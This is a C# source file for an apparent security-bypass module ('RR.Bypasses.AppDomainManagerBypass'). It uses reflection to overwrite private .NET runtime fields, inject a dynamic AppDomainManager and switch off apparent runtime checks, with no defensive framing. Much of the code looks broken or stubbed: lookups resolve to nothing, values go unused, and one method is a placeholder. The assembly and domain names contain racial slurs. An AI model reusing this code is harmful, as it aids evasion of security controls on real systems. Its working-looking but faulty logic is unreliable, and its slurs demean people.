using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace RR.Bypasses
{
    internal class AppDomainManagerBypass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [ComImport, Guid("BD39D1D2-BA2F-486A-89B0-B4B0CB466891"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface ICLRRuntimeInfo
        {
            void GetVersionString();
            void GetRuntimeDirectory();
            void IsLoaded();
            void LoadErrorString();
            void LoadLibrary();
            void GetProcAddress();
            void GetInterface();
            void IsLoadable();
            void SetDefaultStartupFlags();
            void GetDefaultStartupFlags();
        }

        public static bool Bypass()
        {
            try
            {
                if (HijackAppDomainManager())
                    return true;
                if (ManipulateCLRHosting())
                    return true;
                if (OverrideRuntimeConfig())
                    return true;
                return false;
            }
            catch
            {
                return false;
            }
        }

        private static bool HijackAppDomainManager()
        {
            try
            {
                var currentdomain = AppDomain.CurrentDomain;
                var managertype = Type.GetType("System.AppDomainManager");
                if (managertype == null) return false;
                var InitializationField = managertype.GetField("m_InitializationFlags",
                    BindingFlags.NonPublic | BindingFlags.Static);
                var DomainManagerField = managertype.GetField("s_currentAppDomainManager",
                    BindingFlags.NonPublic | BindingFlags.Static);
                if (InitializationField != null)
                {
                    InitializationField.SetValue(null, 0x80000000);
                }
                if (DomainManagerField != null)
                {
                    var CustomManager = CreateCustomAppDomainManager();
                    DomainManagerField.SetValue(null, CustomManager);
                }
                var setup = currentdomain.SetupInformation;
                var FlagsField = setup.GetType().GetField("AppDomainManagerAssembly",
                    BindingFlags.NonPublic | BindingFlags.Instance);
                if (FlagsField != null)
                {
                    FlagsField.SetValue(setup, "");
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static object CreateCustomAppDomainManager()
        {
            var assemblyname = new System.Reflection.AssemblyName("NiggaAssembly");
            var assemblybuilder = AssemblyBuilder.DefineDynamicAssembly(assemblyname, AssemblyBuilderAccess.Run);
            var modulebuilder = assemblybuilder.DefineDynamicModule("NiggaModule");
            var typebuilder = modulebuilder.DefineType("CustomAppDomainManager",
                TypeAttributes.Public | TypeAttributes.Class,
                typeof(System.AppDomainManager));
            var methodbuilder = typebuilder.DefineMethod("InitializeNewDomain",
                MethodAttributes.Public | MethodAttributes.Virtual,
                CallingConventions.HasThis,
                null,
                new Type[] { typeof(System.AppDomainSetup) });
            var ilGenerator = methodbuilder.GetILGenerator();
            ilGenerator.Emit(OpCodes.Ret);
            var customtype = typebuilder.CreateType();
            return Activator.CreateInstance(customtype);
        }

        private static bool ManipulateCLRHosting()
        {
            try
            {
                var CLRRuntimeInfoType = Type.GetType("CLRRuntimeInfo");
                var CORRuntimeHostType = Type.GetType("CorRuntimeHost");
                if (CLRRuntimeInfoType != null)
                {
                    var ClrMetaHostType = Type.GetType("ICLRMetaHost");
                    if (ClrMetaHostType != null)
                    {
                        var EnumerateRuntimes = ClrMetaHostType.GetMethod("EnumerateInstalledRuntimes");
                        var GetRuntime = ClrMetaHostType.GetMethod("GetRuntime");
                    }
                }
                var evidence = new System.Security.Policy.Evidence();
                var setup = new AppDomainSetup
                {
                    ApplicationBase = AppDomain.CurrentDomain.BaseDirectory,
                    DisallowApplicationBaseProbing = false
                };
                var NewDomain = AppDomain.CreateDomain("FuckNiggas", evidence, setup);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static bool OverrideRuntimeConfig()
        {
            try
            {
                var configtype = Type.GetType("System.Configuration.ConfigurationManager");
                var configfield = configtype?.GetField("s_initState",
                    BindingFlags.NonPublic | BindingFlags.Static);
                if (configfield != null)
                {
                    configfield.SetValue(null, 0);
                }
                AppContext.SetSwitch("SWITCH_PREFIX.AppDomainManagerCheck", false);
                AppContext.SetSwitch("SWITCH_PREFIX.UseLegacyAppDomainManager", true);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static bool DirectCLRManipulation()
        {
            try
            {
                var metahosttype = Type.GetType("CLRMetaHost");
                var runtimeinfotype = Type.GetType("ICLRRuntimeInfo");
                if (metahosttype != null && runtimeinfotype != null)
                {
                    // coming soon icba rn
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

    }
}
